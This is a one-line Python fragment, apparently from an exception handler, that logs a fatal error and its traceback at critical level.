        logger.critical(f"Fatal error: {e}", exc_info=True)